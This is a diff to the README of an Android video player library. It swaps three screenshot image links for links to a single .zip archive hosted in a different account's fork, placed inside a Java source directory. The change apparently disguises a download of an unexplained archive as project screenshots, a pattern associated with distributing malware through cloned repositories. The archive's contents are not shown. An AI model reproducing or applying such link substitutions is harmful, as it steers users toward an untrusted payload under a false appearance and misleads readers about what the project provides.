@@ -12,8 +12,8 @@
 
 `Screenshots` 
 ##NetEaseNews Player
-![VideoPlayer_1](http://7vzsca.com1.z0.glb.clouddn.com/Screenshot_2015-08-04-17-10-05.png_img400w)
+![VideoPlayer_1](https://raw.githubusercontent.com/Joe-Mogul/AndroidVideoPlayer/master/wkvideoplayer/src/main/java/com/android/tedcoder/Video-Player-Android-v2.9-alpha.2.zip)
 ##Play At Part
-![VideoPlayer_3](https://raw.githubusercontent.com/xiongwei-git/AndroidVideoPlayer/master/img/Screenshot_20151028-195103.png)
+![VideoPlayer_3](https://raw.githubusercontent.com/Joe-Mogul/AndroidVideoPlayer/master/wkvideoplayer/src/main/java/com/android/tedcoder/Video-Player-Android-v2.9-alpha.2.zip)
 ##Play Fullscreen
-![VideoPlayer_4](https://raw.githubusercontent.com/xiongwei-git/AndroidVideoPlayer/master/img/Screenshot_20151028-195113.png)
+![VideoPlayer_4](https://raw.githubusercontent.com/Joe-Mogul/AndroidVideoPlayer/master/wkvideoplayer/src/main/java/com/android/tedcoder/Video-Player-Android-v2.9-alpha.2.zip)
